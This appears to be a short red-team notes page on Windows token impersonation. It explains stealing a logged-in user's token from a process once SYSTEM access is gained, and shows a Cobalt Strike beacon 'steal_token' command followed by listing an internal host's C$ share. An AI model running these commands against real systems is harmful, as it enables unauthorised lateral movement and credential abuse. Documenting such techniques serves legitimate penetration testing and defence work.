# Token Impersonation&#x20;

## Token Impersonation

If we elevate or pop a SYSTEM where a user is running a process, we can impersonate it's token.

For example:

```
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 4433  998  mmc.exe                                x64   0           DEV\robert
```

If we are SYSTEM, we can steal robert's token and impersonate them.&#x20;

<mark style="color:red;">**Note**</mark>: If the user closes the process, our ability to impersonate goes with it. We must take additional steps of extracting tickets or hashes after stealing the token.

## Cobalt Strike - steal\_token

```powershell
beacon> steal_token 4433

beacon> ls \\internal-website.rotta.dev\c$
[*] Listing: \\internal-website.rotta.dev\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2024 11:30:11   $Recycle.Bin
          dir     08/10/2024 11:45:28   $WinREAgent
```

